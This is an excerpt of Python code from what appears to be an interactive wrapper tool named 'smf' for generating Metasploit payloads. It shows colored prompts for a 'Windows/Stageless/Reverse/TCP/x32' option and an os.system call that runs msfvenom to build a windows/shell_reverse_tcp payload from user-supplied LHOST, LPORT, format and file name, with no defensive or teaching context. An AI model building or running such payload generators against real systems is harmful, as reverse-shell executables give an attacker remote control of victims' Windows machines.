...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mWindows/Stageless/Reverse/TCP/x32\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mWindows/Stageless/Reverse/TCP/x32\033[1;31m)> \033[1;32m")
...
time.sleep(3)
os.system(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f {File_Type} -o {File}.{File_Type}")
